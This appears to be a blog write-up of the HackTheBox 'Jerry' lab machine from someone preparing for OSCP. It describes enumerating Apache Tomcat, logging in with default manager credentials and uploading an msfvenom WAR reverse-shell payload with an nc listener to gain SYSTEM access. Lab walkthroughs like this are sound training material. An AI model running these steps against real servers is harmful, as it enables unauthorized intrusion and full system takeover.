title: HackTheBox:Jerry
---

Today's box on my OSCP journey is Jerry from HackTheBox.  This was an easy box.  Once you get a shell, you're done.  It was good practice for thinking about the basics and NOT to overthink something.  Always start with the easy stuff and move your way up.  Don't jump right into advanced stuff.  I've read before that enumeration is 50% of OSCP, and this box proved that point.  So hit play on Primus' "Jerry was a race car driver" and let me tell you how I thought through it.

### Disclaimer

These isn't "here's how I got root after following someone else's writeup".  The best part about the OSCP journey has been the persepctive I've gained looking at systems and thinking through them, especially coming from a blue team background.  I like to write these to help explain how I thought through the box, where I needed help, and what I learned.

We're definitely looking at a web vuln.  No obvious ports open to tell us if it's Linux or Windows. Apache could be either.

Well, let's hit the home page and kick off gobuster while we manually search for robbots.txt and any obvious things.

> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.95:8080 -t 25

I find no Robots.txt, but it's definitely Apache (confirming what NMAP told us):

> The requested URL /robots.txt was not found on this server.

The homepage is a default Apache page, so I decide to start hunting for a version number.  Hopefully I can find an unauthenticated remote code execution or something.

![jerryhome](/images/jerry1.png)

I'm not finding much and there a ton of links, especially in /docs.  What do you have for us, gobuster?

I kick off gobuster again with a different wordlist.  There's gotta be something juicy here.  /docs is huge and eating up too much time, /examples is a dead end, aux and con don't even load anything, but /manager gets a popup for a login.

![jerryhome](/images/jerry2.png)

I'm still not seeing a version, but at least we found a login we can brute force.  I'm out of ideas except to brute force.  To make sure I've covered all my bases, I use nikto:

```

```

Wait... does that say the password and username displayed on that login pag eAFTER I failed to login is the actual username and password?  I don't have to brute force?

My 2nd gobuster finishes, but it doesn't give me much else:

There's manager again.  "This is the way" -gobuster, who might also be a Mandalorian.

I try the login on /manager again, but it doesn't let me in!  What the heck!  I start a web search for default tomcat accounts and passwords.  I still don't have a version so this is a pain.  I start cycling through this [Default-Credentials github repo](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown).

I'm mindlesslly trying these combination as I really don't wanna fire up hydra and wait for rockyou to go through this.  Ding!  Wait, the default password was "s3cret"?  Didn't I already try that?  I log out and log back in just to verify.  Oh crap.  I must have mistyped it the first time and just gave up.  Way to "try harder" spankowitz.  Anyway, I finally find that version number.

##  Research

One thing I'm kind of experimenting with at this point is continuing to enumerate instead of jumping down the path I'm currently on.  In that spirit, rather than checking out the config, I want to see if this version has any well-kown vulnerabilities. Searchsploit:

There's some priviesc, but nothing catches my eye.  Let's go abck to exploring.  I don't have to go very far before I find an upload:

![jerryhome](/images/jerry4.png)

What the heck is a war file?  Some searching tells me that it's basically a zipped up java directory: [WAR Wiki](https://en.wikipedia.org/wiki/WAR_(file_format)).  Doing a web search for msfvenom and "war" quikly turn up results, so we can get a shell this way.


### Exploit

Let's create a palyload and upload it.

>msfvenom -p java/shell_reverse_tcp lhost=10.10.14.52 lport=9999 -f war > dontclickmebro.war

Go back to the page above and upload it.  Start a netcat listener for 9999.

> nc -nlvp 9999

Open the file you just uploaded in your browser.  You don't even have to copy/paste, just click it in the manager page.  And boom, shell popped.

```
connect to [10.10.14.35] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

Wait, seriously?  We're system?  That was easy.  Did they make this vulnerable on purpose?  Let's find out.  [Apache Docs](https://httpd.apache.org/docs/2.4/platform/windows.html)

And I quote:

"By default, all Apache services are registered to run as the system user (the LocalSystem account). The LocalSystem account has no privileges to your network via any Windows-secured mechanism, including the file system, named pipes, DCOM, or secure RPC. It has, however, wide privileges locally.

It is recommended that users create a separate account for running Apache service(s)."

Oh jeez.  So this box is a demonstration of a common misconfig plus leaving a default cred enabled.  But it localsystem the same as system?  Seems that way [MS Docs](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account)

"The LocalSystem account is a predefined local account used by the service control manager... It has extensive privileges on the local computer, and acts as the computer on the network. Its token includes the NT AUTHORITY\SYSTEM and BUILTIN\Administrators SIDs;"

Well, TIL...

This box was a little too easy.  I wonder if there was another way?  I at least want to poke around Apache.  What if we weren't able to upload that payload?  I do a web search and find this helpful post: [Hackingarticles](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
)

I follow the instructions there to make my own webshell upload.  This is a smaller payload so it might actually be better to put in my cheatsheet.  Here's a screenshot of it in action running systeminfo.

![jerryyhome](/images/jerry6.png)

Well that was fun, rab the flags and we're done.  The biggest lesson for me was beating my head over that stupid password.  My instincts were good and my next step would've been a brute force, which would have eventually found it.
